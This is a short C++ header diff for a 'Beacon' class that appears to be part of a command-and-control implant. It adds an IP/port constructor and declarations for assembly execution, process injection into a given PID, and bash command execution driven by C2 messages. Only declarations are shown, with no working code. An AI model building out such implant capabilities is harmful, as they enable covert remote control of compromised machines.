@@ -21,13 +21,19 @@ class Beacon
 {
 
 public:
-	Beacon();
+	Beacon(std::string& ip, int port);
 	~Beacon();
-
-	int runTcp();
 
 protected:
 	bool execInstruction(C2Message& c2Message, C2Message& c2RetMessage);
+
+	std::string m_ip;
+	int m_port;
+
+private:
+	std::string execAsembly(const std::string& payload);
+	std::string inject(int pid, const std::string& payload);
+	std::string execBash(const std::string& cmd);
 
 	std::vector<std::unique_ptr<std::thread>> m_threadsExec;
 };
